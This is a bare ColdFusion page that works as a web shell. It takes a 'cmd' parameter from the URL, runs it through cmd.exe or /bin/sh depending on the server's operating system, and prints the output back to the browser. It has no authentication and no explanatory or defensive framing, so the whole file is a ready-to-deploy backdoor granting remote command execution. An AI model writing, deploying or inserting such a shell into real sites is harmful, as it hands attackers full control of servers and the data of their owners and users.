<cfif isDefined("url.cmd")>
    <cfif findNoCase("windows", server.os.name)>
        <cfset args = "/c " & url.cmd>
        <cfset bin  = "cmd.exe">
    <cfelse>
        <cfset args = "-c """ & url.cmd & """">
        <cfset bin  = "/bin/sh">
    </cfif>
    <cfexecute name="#bin#" arguments="#args#" timeout="10" variable="out"></cfexecute>
    <cfoutput><pre>#out#</pre></cfoutput>
</cfif>
